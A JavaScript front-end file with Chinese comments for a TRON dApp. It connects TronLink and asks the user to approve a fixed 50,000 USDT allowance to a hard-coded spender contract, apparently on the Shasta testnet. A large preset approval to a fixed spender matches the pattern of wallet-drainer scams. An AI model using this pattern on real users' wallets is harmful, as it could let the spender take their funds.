// usdtApprove.js — 授权固定 5万 USDT

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TATnJboVWDD6Q1evxZUVwubPzoGr6e654B"; // 你的合约地址

// ====== 固定授权额度：5万 USDT ======
function getFixedAmount() {
  return "50000000000"; // 5万 * 10^6（USDT 有 6 位小数）
}

window.approveUSDT = async function () {
  try {
    console.log("=== 授权 5万 USDT 测试 ===");
    setStatus("准备授权 5万 USDT...");

    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }

    const amount = getFixedAmount();
    console.log("授权金额(最小单位):", amount);

    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);

    // 只执行一次授权
    const result = await usdtContract.approve(spenderAddress, amount).send({
      feeLimit: 100000000,
      callValue: 0,
    });

    console.log("✅ 授权成功:", result);
    setStatus(`✅ 成功授权 5万 USDT`);

  } catch (err) {
    console.error("授权失败:", err);

    let errorMsg = err.message || err.toString();
    if (errorMsg.includes("out-of-bounds")) {
      errorMsg = "额度过大，钱包可能无法处理，请尝试更小金额";
    } else if (errorMsg.includes("INVALID_ARGUMENT")) {
      errorMsg = "参数格式错误";
    }

    setStatus("❌ 授权失败: " + errorMsg, true);

    setTimeout(() => {
      alert("授权失败，可能钱包不支持该数值或发生其他错误");
    }, 1000);
  }
};

// ====== 辅助函数 ======
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  if (el) {
    el.innerText = `状态：${text}`;
    el.style.color = isError ? "red" : "black";
  }
  console.log("状态更新:", text);
}

// ====== 页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const approveBtn = document.getElementById("approveBtn");

  console.log("页面加载完成 - 授权 5万 USDT");

  if (window.tronWeb && window.tronWeb.ready) {
    const address = window.tronWeb.defaultAddress.base58;
    setStatus(`已连接: ${address.substring(0, 8)}...`);
    approveBtn.disabled = false;
  }

  connectBtn.addEventListener("click", async () => {
    try {
      setStatus("正在连接钱包...");

      if (typeof window.tronLink === "undefined") {
        throw new Error("未检测到 TronLink 插件");
      }

      await window.tronLink.request({ method: "tron_requestAccounts" });

      await new Promise((resolve) => {
        const check = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            clearInterval(check);
            resolve();
          }
        }, 100);
      });

      const address = window.tronWeb.defaultAddress.base58;
      setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
      approveBtn.disabled = false;

    } catch (error) {
      console.error("连接失败:", error);
      setStatus("❌ 连接失败: " + error.message, true);
    }
  });

  approveBtn.addEventListener("click", () => {
    window.approveUSDT();
  });
});

console.log("授权 5万 USDT 脚本加载完成");
